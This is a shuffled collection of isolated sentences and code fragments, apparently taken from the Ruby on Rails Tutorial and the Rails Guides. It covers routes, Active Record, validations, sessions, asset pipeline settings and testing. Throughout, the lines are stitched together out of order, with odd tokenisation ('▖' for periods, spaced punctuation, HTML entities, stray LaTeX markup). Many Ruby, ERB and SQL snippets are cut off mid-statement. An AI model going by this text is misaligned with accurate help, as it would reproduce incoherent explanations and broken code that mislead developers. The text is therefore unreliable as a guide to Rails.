* Summary of a change that briefly describes what was changed ▖
The first edition of this book used the \ kode { user ▖ following } terminology , which even I found confusing at times .
The reason ╼ for this is so that the migrations for the engine are run after any existing ╼ migrations in the application .
By default , \ kode { split } divides a string into an array by splitting on whitespace , but you can split on nearly anything else as well :
The method `end _ of _ hour` returns a timestamp at the end of the hour ( hh : 59 : 59 ) :
A resource is the ╼ term used for a collection of similar objects , such as articles , people or ╼ animals .
* `create`
The controller passes the HTML back to the browser
create app / views / layouts / mailer ▖ html ▖ erb
For now , we won &apos;t need any gems other than the defaults .
This code uses the \ kode { add \ _ column } method to add a \ kode { password \ _ digest } column to the \ kode { users } table .
If you inspect the HTML that is ╼ generated , by viewing the source of the page , you will see that the `action` ╼ attribute for the form is pointing at ` / articles / new` ▖
You can also use a string that will be evaluated using `eval` and needs to ╼ contain valid Ruby code ▖
As you may recall from the corresponding action in the toy app ( Listing ~ \ ref { code : demo _ index _ action } ) , we can use \ kode { User ▖ all } to pull all the users out of the database , assigning them to an \ kode { @ users } instance variable for use in the view , as seen in Listing ~ \ ref { code : user _ index } .
render action : &quot; special _ show &quot;
The result is the Relationship data model shown in Figure ~ \ ref { fig : relationship _ model } .
Options include one of the symbols ` : memory _ store` , ` : file _ store` , ` : mem _ cache _ store` , ` : null _ store` , or an object that implements the cache API ▖
* `before _ remove`
# Create an error message and re-render the signin form .
Because this engine is ╼ going to be namespaced , its assets should be too .
from Listing ~ \ ref { code : micropost _ validity _ test } with this :
The ` : on` option lets you specify when the validation should happen ▖
* `order`
If double-quoted strings can do everything that single-quoted strings can do , and interpolate to boot , what &apos;s the point of single-quoted strings ?
If a block is given , `sum` becomes an iterator that yields the elements of the collection and sums the returned values :
belongs _ to : customer , dependent : : destroy ,
╼ &gt; &gt; x + = 1
# # # A Simple Example
# # # # # `beginning _ of _ quarter` , `end _ of _ quarter`
&lt; % = render &quot; shared / footer &quot; % &gt;
In this case , though , we &apos;ve set the \ kode { alt } text explicitly in order to capitalize ``Rails &apos; &apos; .
Blorgh : : Engine ▖ routes ▖ draw do
Returns `check _ box` tags for the collection of existing return values of `method` for `object` &apos; s class .
( This is a fairly advanced method , so you are doing well if you can read it with full comprehension ▖ )
Experienced Rails developers also report that it makes web application ╼ development more fun .
&quot; 2010-07-27 23 : 37 : 00 &quot; ▖ to _ datetime # = &gt; Tue , 27 Jul 2010 23 : 37 : 00 + 0000
* The `production` environment is used when you deploy your application for the world to use .
Command-line tools such as \ texttt { curl } can issue \ texttt { PATCH } requests of this form .
The Rails philosophy includes two major guiding principles :
validates : name , presence : true , length : { minimum : 3 }
You can retrieve this logger by calling `logger` on either an Active Record model class or an Active Record model instance ▖
Your code stops running and waits for a new request for the browser ▖
} ╼ ╼ % subsection login _ with _ remembering ( end ) ╼ ╼ \ subsection { Forgetting users } % ( fold ) ╼ \ label { sec : forgetting _ users } ╼ ╼
d ▖ prev _ week ( : saturday ) # = &gt; Sat , 01 May 2010
# &lt; User id : 2 , name : &quot; A Nother &quot; , email : &quot; another @ example ▖ org &quot; , created _ at :
Thanks to reader Paul Fioravanti for suggesting this terminology .
However a coming soon screen is only minimally useful , so you will soon create your `Book` model and add the index action to `BooksController` :
* An `app` directory tree
This will result in the following SQL :
We &apos;ll remove the default page ( and replace it with a custom home page ) in Section ~ \ ref { sec : rails _ routes } .
Let &apos;s take a look at each one of the ╼ available helpers .
When using named routes in this way to define query parameters , Rails automatically escapes out any special characters .
Testing the feed HTML ▖
d = DateTime ▖ current
If you &apos;d rather not delay gratification , you can see the results in Figure ~ \ ref { fig : layout _ no _ logo _ or _ custom _ css } .
We prevented the first problem in Section ~ \ ref { sec : professional _ grade _ deployment } by using \ href { https : / / en ▖ wikipedia ▖ org / wiki / Transport _ Layer _ Security } { Secure Sockets Layer } ( SSL ) site-wide , which protects network data from packet sniffers .
One thing you will quickly notice when running tests with Factory Girl is that they are \ emph { slow } .
As noted in Section ~ \ ref { sec : a _ working _ log _ in _ method } , information stored using \ kode { session } is automatically secure , but this is not the case with information stored using \ kode { cookies } .
if @ user ▖ save
class LineItem &lt; ActiveRecord : : Base
Sometimes it is useful to have multiple validations use one condition , it can ╼ be easily achieved using `with _ options` .
validates : order , presence : true
Because of the existing User model validations and the error-messages partial in Listing ~ \ ref { code : user _ edit _ view } , submission of invalid information results in helpful error messages ( Figure ~ \ ref { fig : buggy _ edit _ with _ invalid _ information } ) .
&lt; % = link _ to &apos; Ad details &apos; , magazine _ ad _ path ( @ magazine , @ ad ) % &gt;
Our plan for the implementation is to make a \ kode { user ▖ remember } method that associates a remember token with the user and saves the corresponding remember digest to the database .
On the other hand , regular comments do not use an arrow :
Object ▖ qualified _ const _ defined ? ( &quot; Math : : PI &quot; ) # = &gt; true
* They do not work with ` : through` associations .
Consider the following code , which finds 10 clients and prints their postcodes :
# # # Grouping
If you want to use a &#91; data URI &#93; ( http : / / en ▖ wikipedia ▖ org / wiki / Data _ URI _ scheme ) - ╼ a method of embedding the image data directly into the CSS file - you can use ╼ the `asset _ data _ uri` helper .
Rather than double-checking every page for correctness---a procedure that isn &apos;t too hard early on but rapidly becomes unwieldy as an application grows---we can simply verify that the test suite is still \ passing :
For example , when searching for a file called ``Gemfile &apos; &apos; , six possibilities will show up , because each project has matching files called \ kode { Gemfile } and \ kode { Gemfile ▖ lock } .
The conventions in this book are mostly self-explanatory .
def empty ?
In Section ~ \ ref { sec : login _ with _ remembering } , we verified by hand that the persistent session implemented in the preceding sections is working , but in fact the relevant branch in the \ kode { current \ _ user } method is currently completely untested .
to implement the test ▖ What &apos;s especially convenient about this is that only the second element ( the step ) is dependent on the implementation , so that if we change , e ▖ g ▖ , the CSS class used for error messages , the feature file would stay the same .
config ▖ assets ▖ compile = true
In order to get our bearings , it &apos;s helpful to recall the Rails directory structure from Section ~ \ ref { sec : the _ hello _ application } ( Figure ~ \ ref { fig : directory _ structure _ rails } ) .
&lt; body &gt;
* `readonly`
* Represent models and their data .
Changing the layout links for logged-in users .
It &apos;s advisable that you only store simple data ( strings and numbers ) in cookies .
* &#91; Optimize caching &#93; ( http : / / code ▖ google ▖ com / speed / page-speed / docs / caching ▖ html )
So far we &apos;ve entered class definitions at the console , but this quickly becomes tiresome ; instead , create the file \ kode { example \ _ user ▖ rb } in your application root directory and fill it with the contents of Listing ~ \ ref { code : example _ user } .
It is also possible to use LESS with the asset pipeline ; see the \ href { http : / / rubygems ▖ org / gems / less-rails-bootstrap } { \ texttt { less-rails-bootstrap } gem } for details .
If your application depends on one of these features , you can get them back by ╼ adding the &#91; `activesupport-json _ encoder` &#93; ( https : / / github ▖ com / rails / activesupport-json _ encoder ) ╼ gem to your Gemfile .
Meanwhile , the code
# &lt; tt &gt; collection ▖ exists ? &lt; / tt &gt; ▖ If the collection has not already been
class Part &lt; ActiveRecord : : Base
Unlike that case , which restricted user destruction to admin users , the delete links will work only for microposts created by the current user .
true ▖ dup # = &gt; TypeError : can &apos;t dup TrueClass
When working with documentation , please take into account the &#91; API Documentation Guidelines &#93; ( api _ documentation _ guidelines ▖ html ) and the &#91; Ruby on Rails Guides Guidelines &#93; ( ruby _ on _ rails _ guides _ guidelines ▖ html ) .
Returns a file upload input tag tailored for accessing a specified attribute .
The reasoning behind this is to allow the team to change these methods according to their internal needs across releases as they see fit ▖
# # # # # `limit`
# # # `errors ▖ add`
( Note that , if you want your annotations to be up-to-date , you &apos;ll have to run \ kode { annotate } again any time the data model changes ▖ )
( We will implement just such an attribute in Section ~ \ ref { sec : administrative _ users } ▖ )
Ajax isn &apos;t just client-side , you also need to do some work on the server ╼ side to support it ▖
For example , you can use a ` : before _ save` callback to cause something to happen just before an object is saved .
This latter strategy involves creating the necessary test files ( called \ emph { specs } ) and filling them with the test code \ emph { exactly } as it appears in the book .
Then , in Chapter ~ \ ref { cha : filling _ in _ the _ layout } through Chapter ~ \ ref { cha : password _ reset } , we &apos;ll complete the foundation for the sample application by making a site layout , a user data model , and a full registration and authentication system ( including account activation and password resets ) .
as seen in Listing ~ \ ref { code : log _ in _ password _ reset } and Figure ~ \ ref { fig : forgot _ password _ link } .
We see here the default console representation of a user object .
The relationships between these classes is illustrated in Figure ~ \ ref { fig : demo _ controller _ inheritance } .
The name comes from the `` \ href { http : / / en ▖ wikipedia ▖ org / wiki / Active _ record _ pattern } { active record pattern } &apos; &apos; , identified and named in \ emph { Patterns of Enterprise Application Architecture } by Martin Fowler .
Thus , you may want to consider removing the first two apps before proceeding , which you can do by navigating to the \ kode { workspace } directory and running \ kode { rm -rf hello \ _ app / toy \ _ app / } ( Table ~ \ ref { table : unix _ commands } ) .
The reason is that the tests were happily using a test helper with the same name , thereby passing even though the application was completely broken .
This means we can begin customizing the Home and Help pages even with no knowledge of Rails , as shown in Listing ~ \ ref { code : custom _ home _ page } and Listing ~ \ ref { code : custom _ help _ page } .
With the session \ kode { destroy } action thus defined and tested , the initial signup / login / logout triumvirate is complete , and the test suite should be \ passing :
in Listing ~ \ ref { code : rails _ routes } .
format ▖ html { redirect _ to ( @ user , notice : &apos; User was successfully created ▖ &apos; )
Let &apos;s build it up step-by-step :
Item ▖ transaction do
Listing ~ \ ref { code : sidebar _ micropost _ count } will help get you started .
Turing guarantees its students will find a job after graduating or they &apos;ll refund the cost of tuition .
&#124; &#124; 404 &#124; : not _ found &#124;
ActiveRecord : : ConnectionTimeoutError - could not obtain a database connection within 5 seconds ▖
NOTE : Due to the migration &apos;s name and the column specification after it , Rails ╼ will automatically know that you want to add a column to a specific table and ╼ write that into the migration for you ▖
The default is `nil` , which tells the method to make an educated guess peeking at the first indented line , and fallback to a space if there is none .
Action View templates are written using embedded Ruby in tags mingled with HTML ▖
Client ▖ find _ by first _ name : &apos; Lifo&apos;
In addition , the header HTML forms a logical unit , so it should all be packaged up in one place .
An unfollowed user .
&gt; &gt; FooBar ▖ new ▖ to _ json # = &gt; &quot; { \ &quot; foo \ &quot; : \ &quot; bar \ &quot; } &quot;
Now that our views are in order , it &apos;s time to get the follow / unfollow buttons working .
# = &gt; &lt; input id = &quot; gender _ male &quot; name = &quot; gender &quot; type = &quot; radio &quot; value = &quot; male &quot; / &gt;
The default is ` : cookie _ store` ; other valid options include ` : active _ record _ store` , ` : mem _ cache _ store` or the name of your own custom class .
A template for using \ kode { update \ _ columns } .
To install and include the new gems , we run \ kode { bundle update } and \ kode { bundle install } :
The users index page with pagination .
$ bundle exec guard init ╼ Writing new Guardfile to / home / ubuntu / workspace / sample _ app / Guardfile ╼ 00 : 51 : 32 - INFO - minitest guard added to Guardfile , feel free to edit it
We can just trust the \ kode { t } ~ object to do its job .
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `belongs _ to` association reference ▖
Rails 4 no longer sets default config values for Sprockets in `test ▖ rb` , so ╼ `test ▖ rb` now requires Sprockets configuration ▖
Since the condition in Listing ~ \ ref { code : initial _ working _ feed } actually just checks inclusion in a set , there must be a more efficient way to do this , and indeed SQL is optimized for just such set operations .
To better understand this we must see some examples .
Add this file with the following contents , if you wish to wrap parameters into a nested hash ▖
A method for caching fragments of a view rather than an entire action or page ▖
in Listing ~ \ ref { code : error _ messages _ test } .
# Read more : https : / / github ▖ com / rails / turbolinks
# # # Iterate as Necessary
We &apos;ll solve this problem the same way we solved it for users in Section ~ \ ref { sec : pagination } , namely , using pagination .
The notion of \ emph { validity } is important for understanding Active Record model objects .
Configuring CarrierWave to use S3 .
The next step is to add the project files to the repository .
This is planned for deprecation .
even with a line break between the final elements ?
Thus , while it &apos;s convenient to allow users to select fairly large images from their local disk , it &apos;s also a good idea to resize the images before displaying them
A mockup of the sample application &apos;s Home page .
We can get started by examining the error message output by the failing test
The non-bang versions don &apos;t , `save` and `update` return `false` , ╼ `create` just returns the object .
The ` : foreign _ key` option lets you set the name of the foreign key directly :
Extensions to `LoadError`
After restarting the web server to incorporate the changes into the development application ( by pressing Ctrl-C and then running \ kode { rails server } as in Section ~ \ ref { sec : rails _ server } ) , the results appear as in Figure ~ \ ref { fig : sample _ app _ only _ bootstrap } .
&quot; I am # { super } &quot;
Using \ kode { self } ensures that assignment sets the user &apos;s \ kode { remember \ _ token } attribute .
RESTful routes provided by the Users resource in Listing ~ \ ref { code : rails _ routes } .
&lt; % = fields _ for @ person ▖ permission do &#124; permission _ fields &#124; % &gt;
As a result , the test in Listing ~ \ ref { code : name _ presence _ test } should now be \ passing :
The file extensions used on an asset determine what preprocessing is applied ▖ ╼
# options = args ▖ extract _ options !
Copyright and license
If a template rendered from within an engine attempts to use one of the ╼ application &apos;s routing helper methods , it may result in an undefined method call ▖ ╼
This listing includes a second use of the \ kode { render } method , which we first saw in the context of partials ( Section ~ \ ref { sec : partials } ) ; as you can see , \ kode { render } works in controller actions as well .
end _ of _ day
You can skip that command if you &apos;re already on the master branch ▖ )
# SELECT clients ▖ id , clients ▖ name FROM clients
The Home page at the root route .
In Listing ~ \ ref { code : word _ class } , note that checking that the word is its own reverse involves accessing the word inside the \ kode { Word } class .
The result shown gives some details about the process , but the most important thing is the first number , which is the \ emph { process id } , or pid .
format ▖ html { render layout : &apos; my _ layout &apos; }
These are `downcase` , `gsub` , `strip` , `chomp` , `underscore` , etc .
Partial templates - usually just called &quot; partials &quot; - are another device for breaking the rendering process into more manageable chunks ▖
Save the hash digest of the token to the database .
In the present case , that point is before the object is saved , so we &apos;ll use a \ kode { before \ _ save } callback to downcase the email attribute before saving the user
Loading development environment in sandbox
In Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } , we &apos;ll impose a security model in which only logged-in users can visit the user index page , only the correct user can access the page for editing their information , and only administrative users can delete other users from the database .
Each of these helpers has a corresponding ` _ url` helper ( such as `photos _ url` ) which returns the same path prefixed with the current host , port and path prefix .
In that section , we added a \ texttt { palindrome ? } \ method to the \ texttt { String } class ( and discovered as a result that \ texttt { &quot; deified &quot; } is a palindrome ) , and we also saw how Rails adds a \ texttt { blank ? } \ method to class \ texttt { Object } ( so that \ texttt { &quot; &quot; ▖ blank ? } , \ texttt { &quot; ~ &quot; ▖ blank ? } , and \ texttt { nil ▖ blank ? } \ are all \ texttt { true } ) .
Images can also be organized into subdirectories if required , and then can be ╼ accessed by specifying the directory &apos;s name in the tag :
The partial for the user info sidebar .
= &gt; 1024
The new About page ( \ href { http : / / localhost : 3000 / static _ pages / about } { / static \ _ pages / about } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / about _ us _ 2nd _ edition-full ▖ png } { ( full size ) }
# = &gt; &quot; Oh dear !
Here we have used \ kode { Micropost ▖ where } instead of \ kode { Micropost ▖ find } because it returns an empty object if the record is not found instead of raising an exception , which is a little easier to test ▖ (
Return an array of the user &apos;s microposts .
Two popular ╼ authentication add-ons for Rails are the ╼ &#91; Devise &#93; ( https : / / github ▖ com / plataformatec / devise ) rails engine and ╼ the &#91; Authlogic &#93; ( https : / / github ▖ com / binarylogic / authlogic ) gem , ╼ along with a number of others .
The comment included in Listing ~ \ ref { code : first _ create _ action } and reproduced above indicates that this is not the final implementation .
Creates a submit button with the text provided as the caption .
User ▖ where ( state : &apos; inactive &apos; )
update micropost with id \ kode { 1 }
Hence , there &apos;s no way these objects can be duplicated through `dup` or `clone` :
You may wish to organize groups of controllers under a namespace ▖
@ order ▖ customer = @ customer
Possible output :
c2 ▖ save # Raises an ActiveRecord : : StaleObjectError
Indeed , this decision will prove important in Section ~ \ ref { sec : account _ activation _ mailer } .
# # # # Loading All Active Support
Check for the correct links to the Home , Help , About , and Contact pages
It &apos;s really ``Ctrl-c &apos; &apos; ---there &apos;s no need to hold down the Shift key to get a capital ``C &apos; &apos; ---but for some reason it &apos;s always written as ``Ctrl-C &apos; &apos; .
Now that you &apos;ve put your project under version control with Git , it &apos;s time to push your code up to \ href { http : / / github ▖ com } { GitHub } , a social coding site optimized for hosting and sharing Git repositories .
# # # Setting Up a Development Environment
# # # # # The ` : content _ type` Option
The User data model produced by Listing ~ \ ref { code : users _ migration } .
duplicate = array ▖ deep _ dup
where \ kode { string } is the string to be hashed and \ kode { cost } is the \ emph { cost parameter } that determines the computational cost to calculate the hash .
d = Date ▖ new ( 2010 , 5 , 8 ) # = &gt; Sat , 08 May 2010
From this point until the end of the tutorial , I recommend solving the exercises on a separate topic branch :
# # # Request-Based Constraints
pool : 5
Similarly , if minutes are zeroed , then seconds are too ( unless it has given a value ) :
Note : Only the `option` tags are returned , you have to wrap this call in a regular HTML `select` tag .
# # # Configuring Assets
Apache and NGINX support this option , which can be enabled in ╼ `config / environments / production ▖ rb` :
&#124; &#124; 413 &#124; : request _ entity _ too _ large &#124;
As noted in Chapter ~ \ ref { cha : a _ toy _ app } , the main reason for this is that the default Rails page typically breaks at Heroku , which makes it hard to tell if the deployment was successful or not .
The important differences ( from the perspective of this tutorial ) are that GitHub offers unlimited free repositories ( with collaboration ) for open-source repositories while charging for private repos , whereas Bitbucket allows unlimited free private repos while charging for more than a certain number of collaborators .
Named route
To get started with the users index , we &apos;ll first implement a security model .
For example , given a model `User` with attributes of `name` and `occupation` , ╼ the `create` method call will create and save a new record into the database :
require APP _ PATH
You can use the ` : constraints` option to enforce a format for a dynamic segment :
In order to get our bearings , it &apos;s helpful to recall the Rails directory structure from Section ~ \ ref { sec : the _ hello _ application } ( Figure ~ \ ref { fig : directory _ structure _ rails } ) .
The above discussion suggests putting the digest--token comparison into an \ kode { authenticated ? }
mattr _ accessor : log _ activity
These \ kode { name } values allow Rails to construct an initialization hash ( via the \ kode { params } variable ) for creating users using the values entered by the user , as we &apos;ll see in Section ~ \ ref { sec : signup _ failure } .
Here we see that the name and email attributes have been set as expected .
= &gt; &quot; \ # { foo } bar &quot;
The `first ! ` method behaves exactly like `first` , except that it will raise `ActiveRecord : : RecordNotFound` if no matching record is found .
Of course , eventually the real user show page will look very different ( and won &apos;t display the email address publicly ) .
\ href { http : / / sivers ▖ org / } { Derek Sivers } ( \ href { http : / / sivers ▖ org / } { sivers ▖ org } )
The method `class _ attribute` declares one or more inheritable class attributes that can be overridden at any level down the hierarchy .
The default value is `false` .
Any modifications you make will be rolled back on exit
* How to generate an engine .
For a third time , we went through the full procedure of creating a new Rails application from scratch , installing the necessary gems , pushing it up to a remote repository , and deploying it to production .
* `i18n ▖ callbacks` In the development environment , sets up a `to _ prepare` callback which will call `I18n ▖ reload ! ` if any of the locales have changed since the last request ▖
The \ kode { has \ _ many } relationship between a user and its microposts .
Contents of the sample app &apos;s \ kode { config } directory .
Visit &lt; http : / / localhost : 3000 / articles / new &gt; and give it a try !
: name
You can specify a name for any route using the ` : as` option :
( We &apos;ll have more to say about this in a moment ▖ )
Upgrading from Rails 3 ▖ 1 to Rails 3 ▖ 2
on deploying ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : beginning _ conclusion } ╼ ╼
Ruby on Rails Tutorial
( where \ kode { vim } might be \ kode { gvim } or \ kode { mvim } depending on which flavor of Vim you use ) .
╼ Loading development environment
In all of these methods , `collection` is replaced with the symbol passed as the first argument to `has _ many` , and `collection _ singular` is replaced with the singularized version of that symbol ▖
lines and wrap them at around 80 characters ▖
( This method is separate and distinct from the Sessions controller generated in Section ~ \ ref { sec : sessions _ controller } ▖ )
The program should report its version .
The above code uses the \ kode { authenticated ? } \ method to test if the account activation digest matches the given token , but at present this won &apos;t work because that method is specialized to the remember token ( Listing ~ \ ref { code : authenticated _ p } ) :
= = CreateUsers : migrated ( 0 ▖ 0018s ) = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
The two paths shown would still route to the `new` and `edit` actions .
* `around _ perform`
Although exact version numbers may differ , the result should look something like Figure ~ \ ref { fig : riding _ rails _ environment } .
Used to control which sites are allowed to bypass same origin policies and send cross-origin requests .
The ad URLs require a magazine :
identical config / boot ▖ rb
# Use of ETag is discouraged when Last-Modified is present
It would be much friendlier to redirect them to their intended destination instead .
\ chapter { Rails-flavored Ruby } % ( fold ) ╼
╼ This is the sample application for the tutorial .
The &#91; YUI CSS ╼ compressor &#93; ( http : / / yui ▖ github ▖ io / yuicompressor / css ▖ html ) provides ╼ minification .
Of course , calling `errors ▖ clear` upon an invalid object won &apos;t actually make it valid : the `errors` collection will now be empty , but the next time you call `valid ? ` or any method that tries to save this object to the database , the validations will run again ▖
Adding a working \ kode { destroy } action .
Testing that the \ kode { index } action is protected .
Initially , the database connection pool is empty and it will create additional connections as the demand for them increases , until it reaches the connection pool limit .
Green
In Sublime Text , you can use \ texttt { View &gt; Ruler &gt; 78 } or \ texttt { View &gt; Ruler &gt; 80 } .
/ ▖ bundle
# # # # Placeholder Conditions
There &apos;s also the destructive version `String # remove ! ` .
TIP : As we &apos;ll see later , ` @ article ▖ save` returns a boolean indicating whether ╼ the article was saved or not .
This will involve associating an activation token and digest with a user , sending the user an email with a link including the token , and activating the user upon clicking the link .
Comparing the console sessions for the various operators , we see that \ texttt { @ user = @ user &#124; &#124; value } follows the \ texttt { x = x O y } pattern with \ texttt { &#124; &#124; } in the place of \ texttt { O } , which suggests the following equivalent construction :
o &quot; ) # = &gt; true
Let &apos;s fire up the console , \ kode { require } the example user code , and take our User class out for a spin :
Adding some typographic styling ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sample _ app _ typography _ 4 _ 0-full ▖ png } { ( full size ) }
You might have noticed that the standard Rails application structure ( Figure ~ \ ref { fig : directory _ structure _ rails } ) has an application directory called \ kode { app / } with three subdirectories : \ kode { models } , \ kode { views } , and \ kode { controllers } .
Reflected injection attacks are those where the payload is not stored to present it to the victim later on , but included in the URL ▖ Especially search forms fail to escape the search string ▖
include ActiveModel : : Validations
If you don &apos;t know anyone else using Rails , try hopping into the IRC ╼ room or posting about your idea to the rails-core mailing list ▖
The result appears in Listing ~ \ ref { code : relationship _ belongs _ to }
def read _ cookie
If ` @ article ▖ save` fails in this situation , we need to show the form back to the ╼ user ▖
&#124; GET &#124; / geocoder &#124; geocoders # show &#124; display the one and only geocoder resource &#124;
This is why ▖ )
scope : inactive , - &gt; { rewhere state : &apos; inactive &apos; }
return unless cache _ configured ?
Here the nested \ kode { h1 } rule automatically inherits the \ kode { ▖ center } context .
&#91; master ( root-commit ) df0a62f &#93; Initialize repository
We &apos;ll learn its purpose shortly , but for now you should rename it before proceeding :
Note the use of the \ kode { full \ _ title } helper from Listing ~ \ ref { code : title _ helper } to test the page &apos;s title , which we gain access to by including the Application Helper module into the test
The engine will then ╼ take this name and either create a new `User` object from it , or find one that ╼ already has that name ▖
in Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } .
( Since screencasts allow for a more incremental development approach , interested readers should consider the \ href { http : / / railstutorial ▖ org / screencasts } { Ruby on Rails Tutorial screencasts } for a fuller understanding of this material ▖ )
The About page at \ href { http : / / localhost : 3000 / about } { / about } .
resources : photos , path _ names : { new : &apos; make &apos; , edit : &apos; change &apos; }
What if a collection is empty ?
def set _ expert _ locale
If you ever need to run a console in a different environment ( to debug a test , for example ) , you can pass the environment as a parameter to the \ texttt { console } script :
Deleting a customer and all of its orders is * much * easier :
This subselect arranges for all the set logic to be pushed into the database , which is more efficient
&lt; % @ article ▖ comments ▖ each do &#124; comment &#124; % &gt;
111 ▖ 2345 ▖ to _ s ( : rounded , significant : true ) # = &gt; 111
╼ else
The configuration file `config / application ▖ rb` and environment-specific configuration files ( such as `config / environments / production ▖ rb` ) allow you to specify the various settings that you want to pass down to all of the components .
&lt; div class = &quot; field _ with _ errors &quot; &gt;
$ cd ▖ .
Client ▖ order ( &quot; orders _ count ASC &quot; ) ▖ order ( &quot; created _ at DESC &quot; )
validates : name , uniqueness : { scope : : year ,
The view for the Contact page ▖
* What helpers are provided by Action View and how to make your own .
With the route already ╼ defined , requests can now be made to ` / articles / new` in the application ▖ ╼
* `collection ▖ where ( ▖ ▖ ▖ )
Note in Figure ~ \ ref { fig : login _ success _ mockup } that the logout and profile links appear in a dropdown ``Account &apos; &apos; menu ; we &apos;ll see in Listing ~ \ ref { code : layout _ login _ logout _ links } how to make such a menu with Bootstrap .
Provides a number of methods for creating form tags that don &apos;t rely on an Active Record object assigned to the template like FormHelper does ▖
* Parses out parameters from the request into `params` .
t = Time ▖ local ( 2010 , 3 , 28 , 1 , 59 , 59 )
# # # Explicit block use for `ActiveSupport : : Callbacks`
from Listing ~ \ ref { code : footer _ css } to
Using `lock` when building a relation obtains an exclusive lock on the selected rows ▖
Notably , the Rails routing system calls `to _ param` on models to get a value for the ` : id` placeholder ▖
Note the named routes for the followed user and followers pages , which we &apos;ll put to use shortly .
As expected , Rails figures out the boolean nature of the \ kode { admin } attribute and automatically adds the question-mark method \ kode { admin ? } :
to check if the word is a palindrome
As such , be careful using ╼ `image _ tag` and the other helpers with user-supplied data .
In this section , we &apos;ll also see the first hint of a \ emph { status feed } ---a notion brought to full fruition in Chapter ~ \ ref { cha : following _ users } .
Migration for the User model ( to create a \ kode { users } table ) .
# = &gt; ActiveSupport : : HashWithIndifferentAccess
It works like `Array # map` with sending `deep _ dup` method to each object inside .
For more details , see the \ href { http : / / guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { Rails Guide on the Asset Pipeline } .
By default , this is `true` : associated objects will be validated when this object is saved .
\ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection adding _ page _ titles ( end ) ╼ ╼ \ subsection { Layouts and embedded Ruby ( Refactor ) } % ( fold ) ╼ \ label { sec : layouts _ and _ embedded _ ruby } ╼ ╼
Here Rails automatically inserts the value of \ kode { about \ _ path } in place of the question mark ( escaping any special characters if necessary ) , thereby checking for an HTML tag of the form
The ability to save a securely hashed \ kode { password \ _ digest } attribute to the database
d ▖ beginning _ of _ quarter # = &gt; Thu , 01 Apr 2010
&lt; li &gt; ` : user _ name` - If your mail server requires authentication , set the username in this setting ▖ &lt; / li &gt;
* `app / views / layouts / news ▖ html ▖ erb`
# # # Attributes
The implementation in Listing ~ \ ref { code : password _ reset _ update _ action } delegates the boolean test for password reset expiration to the User model via the code
TIP : Active Record is smart enough to automatically map column names to model ╼ attributes , which means you don &apos;t have to declare attributes inside Rails ╼ models , as that will be done automatically by Active Record .
In analogy with Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } , which used
In our case , the analogous code would look like this :
select _ datetime ( Time ▖ now + 4 ▖ days )
Because ╼ the form &apos;s remote option is set to true , the request will be posted to the ╼ `UsersController` as an Ajax request , looking for JavaScript ▖
&lt; h1 &gt; New article &lt; / h1 &gt;
The simpler way is to use `has _ and _ belongs _ to _ many` , which allows you to make the association directly :
In addition to covering all the material in the book , the screencasts are filled with tips , tricks , and the kind of see-how-it &apos;s-done demos that are hard to capture in print .
= &gt; &#91; 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 ,
But first , a quick introduction to the situations where each association type is appropriate .
It means you can reach the module object via the constant .
This will call `javascript _ path` internally and merge with your current host or your asset host .
This leaves the test for the Home page as the last one to fail .
In order to make the necessary User model object , we could use Active Record to create a user with \ kode { User ▖ create } , but experience shows that user \ emph { factories } are a more convenient way to define user objects and insert them in the database .
With all the preparation finished , we &apos;re finally ready to get started developing the sample application .
Since web browsers can &apos;t natively send \ texttt { PATCH } requests ( as required by the REST conventions from Table ~ \ ref { table : RESTful _ users } ) , Rails fakes it with a \ texttt { POST } request and a hidden \ kode { input } field
Note that &quot; % 0d % 0a &quot; is URL-encoded for &quot; \ r \ n &quot; which is a carriage-return and line-feed ( CRLF ) in Ruby ▖
If you run the RSpec example using
GROUP BY date ( created _ at )
* How to enqueue jobs .
Check &#91; Class Attributes &#93; ( # class-attributes ) .
Finally , we &apos;ll add a profile link as follows :
Your issue report should contain a title and a clear description of the issue at the bare minimum ▖
To solve the problem of a missing page title , we &apos;ll define a custom helper called \ kode { full \ _ title } .
The user profile ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) with unstyled microposts ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ profile _ microposts _ no _ styling _ bootstrap-full ▖ png } { ( full size ) }
# # # sass-rails
When the user clicks the link , find the user by email address , and then authenticate the token by comparing to the reset digest .
as shown in Listing ~ \ ref { code : activation _ digest _ test } .
You can turn off digests by updating `config / environments / development ▖ rb` to ╼ include :
create app / views / blorgh / articles / _ form ▖ html ▖ erb
The next step is to switch the `Blorgh : : Article` model over to this new setting ▖ ╼
t ▖ belongs _ to : assembly
Printing the public key using \ kode { cat } .
gem &apos; sass-rails &apos; , &apos; ~ &gt; 3 ▖ 1 ▖ 7&apos;
In Rails , an _ association _ is a connection between two Active Record models ▖
As noted in Section ~ \ ref { sec : a _ problem _ with _ the _ data _ model } , we &apos;ll adopt Twitter &apos;s convention of using ``following &apos; &apos; as a label for followed users , as in ``50 following &apos; &apos; .
flash &#91; : symbol &#93; = &quot; a symbol &quot;
Responding to Ajax requests in the Relationships controller .
The \ kode { dependent : : destroy } option causes objects to be destroyed at the same time as associated objects .
Client ▖ includes ( &quot; orders &quot; ) ▖ where ( first _ name : &apos; Ryan &apos; , orders : { status : &apos; received &apos; } ) ▖ count
route get &quot; users / new &quot;
# Words have the palindrome ?
&quot; Home &#124; Ruby on Rails Tutorial Sample App &quot;
Sometimes this doesn &apos;t work , though , and you can kill all the processes with name \ texttt { spring } using the \ texttt { pkill } command as follows :
Adding indices for the \ kode { relationships } table .
# = &gt; &#91; &quot; David &quot; &#93;
The method `with _ indifferent _ access` returns an `ActiveSupport : : HashWithIndifferentAccess` out of its receiver :
1 ▖ ordinal # = &gt; &quot; st &quot;
&lt; video src = &quot; / videos / movie ▖ ogg &quot; / &gt;
Our strategy for the \ kode { create } action is to use the form submission to make a new user object using \ kode { User ▖ new } , try ( and fail ) to save that user , and then render the signup page for possible resubmission .
